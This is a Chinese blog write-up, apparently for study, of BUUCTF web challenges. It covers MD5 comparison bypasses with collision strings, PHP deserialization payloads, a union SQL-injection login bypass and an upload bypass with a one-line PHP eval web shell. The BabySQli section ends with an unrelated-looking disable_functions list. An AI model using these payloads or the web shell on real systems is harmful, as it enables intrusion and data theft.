@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WEB-BUU第一页 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="[MRCTF2020]Ez_bypass1I put something in F12 for you include &#39;flag.php&#39;; $flag&#x3D;&#39;MRCTF&amp;#123;xxxxxxxxxxxxxxxxxxxxxxxxx&amp;#125;&#39;; if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&amp;#39">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB-BUU第一页">
+<meta property="og:url" content="http://example.com/2022/11/10/WEB-BUU%E7%AC%AC%E4%B8%80%E9%A1%B5/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="[MRCTF2020]Ez_bypass1I put something in F12 for you include &#39;flag.php&#39;; $flag&#x3D;&#39;MRCTF&amp;#123;xxxxxxxxxxxxxxxxxxxxxxxxx&amp;#125;&#39;; if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&amp;#39">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2022-11-10T12:34:44.000Z">
+<meta property="article:modified_time" content="2023-02-10T12:35:16.203Z">
+<meta property="article:author" content="墨水彩笔">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/10/WEB-BUU%E7%AC%AC%E4%B8%80%E9%A1%B5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2023-02-10 20:35:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">67</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">1.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">MD5绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-number">1.1.</span> <span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">1.2.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">1.3.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-number">1.4.</span> <span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">1.5.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TIPS"><span class="toc-number">1.6.</span> <span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.7.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">WEB-BUU第一页</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-10T12:34:44.000Z" title="Created 2022-11-10 20:34:44">2022-11-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-10T12:35:16.203Z" title="Updated 2023-02-10 20:35:16">2023-02-10</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you include &#39;flag.php&#39;; $flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;; if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123; $id&#x3D;$_GET[&#39;id&#39;]; $gg&#x3D;$_GET[&#39;gg&#39;]; if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123; echo &#39;You got the first step&#39;; if(isset($_POST[&#39;passwd&#39;])) &#123; $passwd&#x3D;$_POST[&#39;passwd&#39;]; if (!is_numeric($passwd)) &#123; if($passwd&#x3D;&#x3D;1234567) &#123; echo &#39;Good Job!&#39;; highlight_file(&#39;flag.php&#39;); die(&#39;By Retr_0&#39;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#39;You can not get it !&#39;; &#125; &#125; else&#123; die(&#39;only one way to get the flag&#39;); &#125; &#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125; &#125; else&#123; die(&#39;Please input first&#39;); &#125; &#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<p>我们分析代码过后知道我们此时需要利用GET传入gg和id，并且他们的md5进行比较，再传入POST值passwd进行函数绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_numeric()函数</span><br><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串。PHP 版本要求：PHP 4, PHP 5, PHP 7</span><br><span class="line">但需要注意的是php中两个&#x3D;是弱比较，那么我们可以利用数字字符串来绕过</span><br></pre></td></tr></table></figure>
+
+<h4 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h4><p>1.数组绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;a&amp;b[]&#x3D;b </span><br></pre></td></tr></table></figure>
+
+<p>2.强类型绕过</p>
+<p>遇到如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">收录一些MD5值相等的字符串</span><br><span class="line"></span><br><span class="line">$Param1&#x3D;&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2&#x3D;&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line"></span><br><span class="line">$data1&#x3D;&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;</span><br><span class="line">$data2&#x3D;&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>3.$a==md5($a)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;0e215962017&#96; 的 MD5 值也是由 **0e** 开头，在 PHP 弱类型比较中相等</span><br></pre></td></tr></table></figure>
+
+<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>题目源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op &#x3D; &quot;1&quot;;</span><br><span class="line">        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;</span><br><span class="line">        $content &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化链条</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先read函数里面可以读取文件</span><br><span class="line">那么找一下哪里调用了read，发现process中调用了，并且read的输出在output中输出</span><br><span class="line">__construct和__destruct调用了process，但__construct的触发条件更简单</span><br><span class="line">那么链条如下</span><br><span class="line">创建	FileHandler 即调用__construct，此时修改值op和filename。进行反序列化</span><br></pre></td></tr></table></figure>
+
+<p>那么我们先尝试下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op&#x3D;2;</span><br><span class="line">    protected $filename&#x3D;‘flag.php’;</span><br><span class="line">    protected $content&#x3D;&#39;hello world&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new FileHandler();</span><br><span class="line">$a &#x3D; serialize($o);</span><br><span class="line">echo $a;</span><br><span class="line"></span><br><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot; * op&quot;;i:2;s:11:&quot; * filename&quot;;s:13:&quot;‘flagphp’&quot;;s:10:&quot; * content&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现存在错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.public属性序列化不会出现不可见字符</span><br><span class="line">2.我们的字符串需要使用双引号，而不是单引号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op&#x3D;2;</span><br><span class="line">    public $filename&#x3D;&quot;flag.php&quot;;</span><br><span class="line">    public $content&#x3D;&#39;hello world&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new FileHandler();</span><br><span class="line">$a &#x3D; serialize($o);</span><br><span class="line">echo $a;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>抓包中发现存在一传内容进行解析</p>
+
+
+<p>明显的SQL注入漏洞，注入点为单引号</p>
+<p>进行FUZZ</p>
+
+
+<p>发现order被过滤，通过Order进行绕过</p>
+
+
+<p>发现字段为3</p>
+<p>想查看库名的时候发现左右括号被过滤</p>
+
+
+<p>并且接下来进行测试时，发现是无回显的</p>
+
+
+<p>那么看来只能用别的方法了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中</span><br></pre></td></tr></table></figure>
+
+<p>那么此时通过字段数为3推测，数据库的结构应该是id,username,password</p>
+<p>因此构造，这里需要注意的是，我们最前面的用户名必须得是不存在的才能触发我们union的创造条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,&#39;admin&#39;,&#39;admin&#39;&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但发现密码还是不对，但账号对了，那说明至少我们的猜测是成立的那么可能是密码进行了加密，那么就试试最常用的md5加密</p>
+
+
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl</span><br></pre></td></tr></table></figure>
+
+<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>通过Burp修改Content-Type: image/jpeg，并因为对于&lt;?进行了过滤因此我们需要利用新的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用var_dump来进行信息显示</p>
+<p>通过语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&#39;&#x2F;&#39;))；</span><br><span class="line">来进行目录扫描</span><br><span class="line">通过函数file_get_contents(&#39;&#x2F;flag&#39;)进行文件读取</span><br><span class="line"></span><br><span class="line">这里需要注意的是我们需要使用单引号</span><br></pre></td></tr></table></figure>
+
